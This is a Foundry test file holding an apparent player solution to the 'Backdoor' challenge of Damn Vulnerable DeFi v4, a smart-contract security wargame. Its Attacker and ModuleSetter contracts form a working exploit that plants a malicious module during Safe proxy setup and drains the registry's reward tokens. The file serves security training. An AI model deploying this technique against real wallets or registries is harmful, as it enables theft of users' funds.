// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
import {IProxyCreationCallback} from "safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";
import {Enum} from "safe-smart-account/contracts/common/Enum.sol";
import {SafeProxy} from "safe-smart-account/contracts/proxies/SafeProxy.sol";


contract BackdoorChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    address[] users = [makeAddr("alice"), makeAddr("bob"), makeAddr("charlie"), makeAddr("david")];

    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;

    DamnValuableToken token;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy Safe copy and factory
        singletonCopy = new Safe();
        walletFactory = new SafeProxyFactory();

        // Deploy reward token
        token = new DamnValuableToken();

        // Deploy the registry
        walletRegistry = new WalletRegistry(address(singletonCopy), address(walletFactory), address(token), users);

        // Transfer tokens to be distributed to the registry
        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(walletRegistry.owner(), deployer);
        assertEq(token.balanceOf(address(walletRegistry)), AMOUNT_TOKENS_DISTRIBUTED);
        for (uint256 i = 0; i < users.length; i++) {
            // Users are registered as beneficiaries
            assertTrue(walletRegistry.beneficiaries(users[i]));

            // User cannot add beneficiaries
            vm.expectRevert(0x82b42900); // `Unauthorized()`
            vm.prank(users[i]);
            walletRegistry.addBeneficiary(users[i]);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    // Attacker contract instance declaration
    Attacker attack ;
    function test_backdoor() public checkSolvedByPlayer {
        // Create a new instance of the Attacker contract with the necessary parameters
        // This deploys the attacker contract and attempts to exploit the vulnerability
        attack = new Attacker(
            address(walletFactory),        // Address of the wallet factory
            address(singletonCopy),        // Address of the singleton contract
            address(walletRegistry),       // Address of the wallet registry
            users,                         // Array of users to be targeted by the exploit
            address(token),                // Address of the token to be used in the exploit
            recovery                       // Address where the stolen tokens should be sent
        );
        
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        for (uint256 i = 0; i < users.length; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            assertTrue(wallet != address(0), "User didn't register a wallet");

            // User is no longer registered as a beneficiary
            assertFalse(walletRegistry.beneficiaries(users[i]));
        }

        // Recovery account must own all tokens
        assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
    }
}   

// Attacker contract that exploits a vulnerability to create proxy contracts and execute unauthorized actions
contract Attacker {
    SafeProxyFactory proxyFactory;
    IProxyCreationCallback creationCallback;
    ModuleSetter moduleSetter;
    SafeProxy proxyInstance;

    // Constructor initializes all necessary components to exploit the vulnerability
    constructor(
        address _proxyFactory,
        address _singleton,
        address registry,
        address[] memory users,
        address token,
        address recovery
    ) {
        // Initialize the ModuleSetter contract
        moduleSetter = new ModuleSetter();
        address moduleSetterAddress = address(moduleSetter);

        // Loop to interact with 4 users and create proxies with malicious logic
        for (uint256 i = 0; i < 4; i++) {
            proxyFactory = SafeProxyFactory(_proxyFactory);
            creationCallback = IProxyCreationCallback(registry);

            // Prepare owner array with the current user and set threshold for proxy creation
            address[] memory owners = new address[](1);
            owners[0] = users[i];
            uint256 threshold = 1;

            // Prepare the payload that sets the malicious module on the proxy
            bytes memory payloadForModule = abi.encodeWithSignature("setModule(address)", moduleSetterAddress);

            // Set up the payload for creating the proxy with malicious behavior
            bytes memory setupPayload = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners,
                threshold,
                moduleSetterAddress,
                payloadForModule,
                address(0),
                address(0),
                0,
                payable(address(0))
            );

            // Create a proxy contract with malicious module setup
            proxyInstance = proxyFactory.createProxyWithCallback(_singleton, setupPayload, i, creationCallback);

            // Transfer token to the malicious proxy to perform unauthorized actions
            moduleSetter.transfer(token, recovery, address(proxyInstance));
        }
    }
}

// ModuleSetter contract that sets malicious modules on created proxies and performs token transfers
contract ModuleSetter {

    // State variable to store the singleton address
    address private singleton;

    // Mapping to store malicious modules
    mapping(address => address) internal modules;

    // Function to set a malicious module on the proxy contract
    function setModule(address scamModule) public {
        modules[scamModule] = address(0x1); // Set the module to a malicious address (0x1 in this case)
    }

    // Function to transfer tokens from the proxy contract
    function transfer(address token, address recoveryAddress, address proxyAddress) public {
        // Prepare the payload to transfer tokens to the recovery address
        bytes memory transferPayload = abi.encodeWithSignature("transfer(address,uint256)", recoveryAddress, 10e18);

        // Execute the token transfer from the proxy using the malicious module
        Safe(payable(proxyAddress)).execTransactionFromModule(token, 0, transferPayload, Enum.Operation.Call);
    }
}